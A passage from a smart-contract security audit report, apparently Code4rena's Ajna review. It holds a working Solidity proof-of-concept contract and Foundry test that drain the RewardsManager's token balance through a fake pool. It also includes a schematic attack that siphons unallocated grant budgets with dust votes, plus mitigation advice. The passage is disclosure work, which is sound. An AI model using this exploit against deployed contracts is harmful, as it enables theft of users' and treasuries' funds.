class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bucketInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpAccumulator_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">availableCollateral_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bankruptcyTime_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketDeposit_</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bucketScale_</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">steal</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">toSteal</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rewardsManager</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositIndexes</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">depositIndexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// setup the `prevBucketExchangeRate`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_currentBurnEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateBucketExchangeRatesAndClaim</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositIndexes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_currentBurnEpoch</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">2</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rewardsManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateBucketExchangeRatesAndClaim</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">depositIndexes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">StealRewardsTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Test</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IRewardsManager</span><span class=\"mtk1\">  </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IPositionManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC20PoolFactory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_poolFactory</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createSelectFork</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">envString</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ETH_RPC_URL&quot;</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">       = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_poolFactory</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC20PoolFactory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PositionManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_poolFactory</span><span class=\"mtk1\">, </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">ERC721PoolFactory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">  = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">RewardsManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajna</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">), </span><span class=\"mtk7\">100_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">100_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testStealRewards</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">StealRewards</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stealRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">StealRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rewardsManagerBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Rewards balance before&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">rewardsManagerBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Hacker balance before &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stealRewards</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">stealRewards</span><span class=\"mtk1\">.</span><span class=\"mtk11\">steal</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stealRewards</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">rewardsManagerBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Rewards balance after &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_rewardsManager</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Hacker balance after  &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_ajnaToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stealRewards</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"tools-used-6\" style=\"position:relative;\"><a href=\"#tools-used-6\" aria-label=\"tools used 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry, IntelliJ</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>updateBucketExchangeRatesAndClaim</code> method should only be able to be called with a valid Ajna pool (see <a href=\"https://github.com/code-423n4/2023-05-ajna/blob/a51de1f0119a8175a5656a2ff9d48bbbcb4436e7/ajna-core/src/PositionManager.sol#L416-L416\">PositionManager._isAjnaPool</a>) and potentially only allow pools from the currently staked tokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/207#issuecomment-1555107286\">MikeHathaway (Ajna) confirmed via duplicate issue <code>#207</code></a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-14\" style=\"position:relative;\"><a href=\"#medium-risk-findings-14\" aria-label=\"medium risk findings 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (14)</h1>\n<h2 id=\"m-01-it-is-possible-to-steal-the-unallocated-part-of-every-delegation-period-budget\" style=\"position:relative;\"><a href=\"#m-01-it-is-possible-to-steal-the-unallocated-part-of-every-delegation-period-budget\" aria-label=\"m 01 it is possible to steal the unallocated part of every delegation period budget permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/465\">[M-01] It is possible to steal the unallocated part of every delegation period budget</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/465\">hyh</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/372\">mrpathfindr</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/338\">bytes032</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/321\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/274\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/270\">Juntao</a>, and <a href=\"https://github.com/code-423n4/2023-05-ajna-findings/issues/87\">aashar</a></em></p>\n<p>Attacker can monitor the standard proposals distribution and routinely steal each low activity period remainder by submitting a <code>transfer to self</code> proposal and voting a dust amount for it.</p>\n<p>Since the criteria for the final slate update is that any increase in total funding votes casted is enough, the attacker’s costs are negligible, while the remainder funds during some periods can be substantial enough for the attacker to setup such a monitoring. I.e. as funds are constant share of the treasury, while activity can differ drastically, a situation when there are less viable proposals then funds can routinely happen over time.</p>\n<p>The assumption of the current logic is that such unallocated funds will be returned to the treasury, but it will not be the case as the cost of stealing such funds is close to zero.</p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A part of treasury funds can be stolen each period and will not be available for ecosystem funding.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Schematic POC:</p>\n<ol>\n<li>Bob monitors the end of each screening period and, whenever it is cheap enough, submits a proposal to send the remainder funds to self via proposeStandard()</li>\n<li>Bob votes for it with fundingVote() with the dust votes he have. Since it is low activity period there are room, and it is included to <code>_topTenProposals</code></li>\n<li>Bob updates the top slate with updateSlate(), repeating current top slate with his proposal added. Since other proposals cumulatively do not allocate full budget and Bob’s proposal have positive funding vote attached, it is included to the slate</li>\n</ol>\n<p>This way Bob obtained the remainder funds nearly for free.</p>\n<p>Core issue here looks to be the absence of the proposal votes threshold, which allows an attacker to claim the remained without any barrier to entry, i.e. having at hand only dust amount of governance tokens.</p>\n<p>Even proposal with zero funding votes can be executed, it is only controlled to be non-negative:</p>\n<p><a href=\"https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441\">https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-grants/src/grants/base/StandardFunding.sol#L421-L441</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_validateSlate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint24</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionId_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">distributionPeriodFundsAvailable_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">numProposalsInSlate_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sum_</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the function is being called within the challenge period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk11\">_getChallengeStageEndBlock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">endBlock</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check that the slate has no duplicates</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">_hasDuplicates</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalIds_</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidProposalSlate</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">distributionPeriodFundsAvailable_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span 